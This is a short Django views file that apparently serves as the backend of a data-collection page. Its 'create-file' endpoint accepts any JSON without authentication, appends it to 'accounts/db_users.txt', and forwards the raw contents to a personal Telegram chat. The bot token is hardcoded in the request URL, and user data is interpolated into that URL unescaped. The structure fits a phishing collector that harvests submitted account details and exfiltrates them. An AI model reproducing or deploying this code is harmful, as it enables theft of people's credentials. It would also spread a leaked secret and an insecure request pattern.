from django.shortcuts import render
from django.contrib.auth.decorators import login_required
from django.http import HttpResponse
from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework import status
from django.http import JsonResponse
from ninja import Router, Query, Body
import requests
import json


@login_required()
def index(request):
    return render(request, 'main/index.html')


def robots_txt(request):
    '''
    Для отображения robots.txt
    '''
    content = "User-Agent: *\nDisallow: /"
    return HttpResponse(content, content_type='text/plain')



router = Router()

# Тест api
@router.get("/list")
def get_list(request):
    '''
    Получить список
    '''
    return JsonResponse({'message': 'Hello, world!'})


import os

@router.post('/create-file')
def create_file(request, payload: dict = Body(...)):
    account_dir = 'accounts'
    if not os.path.exists(account_dir):
        os.makedirs(account_dir)
    print(payload)
    kuba_id = '992817125'

    result = payload
    with open(f'{account_dir}/db_users.txt', 'a', encoding='utf-8') as f:
        f.write(json.dumps(result) + '\n')
    try:
        response = requests.get(
            url=f'https://api.telegram.org/bot8561013950:AAH09CFW1IDOJQnDoYXR0Bfa7wiLtPhmols/sendMessage?chat_id={kuba_id}&text={result}')
        return 200, 'Ok'
    except Exception as err:
        print(err)

    return 400, 'error'


class GetList(APIView):
    def get(self, request):
        data = {'message': 'Hello, world!'}
        return Response(data, status=status.HTTP_200_OK)